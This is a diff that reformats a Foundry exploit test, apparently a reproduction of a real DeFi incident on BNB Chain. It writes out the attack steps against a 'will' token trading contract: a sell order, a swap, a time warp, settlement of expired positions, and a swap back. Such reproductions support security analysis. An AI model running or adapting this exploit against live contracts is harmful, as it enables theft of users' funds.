@@ -13,10 +13,12 @@ import "./../interface.sol";
 
 // GUY : https://x.com/0xNickLFranklin/status/1806704287252394238
 
-interface Trading{
-    function placeSellOrder(uint256 usdtAmount, uint256 margin, uint256 minUsdtReceived) external; 
-    function updateExpiredOrders() external; 
-    function settleExpiredPositions(uint256 minTokensToReceive) external;
+interface Trading {
+    function placeSellOrder(uint256 usdtAmount, uint256 margin, uint256 minUsdtReceived) external;
+    function updateExpiredOrders() external;
+    function settleExpiredPositions(
+        uint256 minTokensToReceive
+    ) external;
 }
 
 contract ContractTest is Test {
@@ -25,10 +27,11 @@ contract ContractTest is Test {
     Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IERC20 will = IERC20(0xe38593e7F4f2411E0C0aB74589A7209681ab4B1d);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    Trading trading=Trading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);
+    Trading trading = Trading(0x566777eD780dbbe17c130AE97b9FbC0A3Ab829DF);
+
     function setUp() external {
-        cheats.createSelectFork("bsc", 39979796);
-        deal(address(USDT), address(this), 180000 ether);
+        cheats.createSelectFork("bsc", 39_979_796);
+        deal(address(USDT), address(this), 180_000 ether);
     }
 
     function testExploit() external {
@@ -38,27 +41,22 @@ contract ContractTest is Test {
     }
 
     function attack() public {
-        USDT.approve(address(trading),type(uint256).max);
-        trading.placeSellOrder(71000 ether, 0, 0);
-        swap_token_to_token(address(USDT), address(will), 88000 ether);
+        USDT.approve(address(trading), type(uint256).max);
+        trading.placeSellOrder(71_000 ether, 0, 0);
+        swap_token_to_token(address(USDT), address(will), 88_000 ether);
         /////step---2
         vm.warp(block.timestamp + 20);
         trading.updateExpiredOrders();
         trading.settleExpiredPositions(0);
-        uint256 willamount=will.balanceOf(address(this));
+        uint256 willamount = will.balanceOf(address(this));
         swap_token_to_token(address(will), address(USDT), willamount);
-
-    
     }
 
-
- function swap_token_to_token(address a,address b,uint256 amount) internal {
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount, 0, path, address(this), block.timestamp
-        );
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
 }
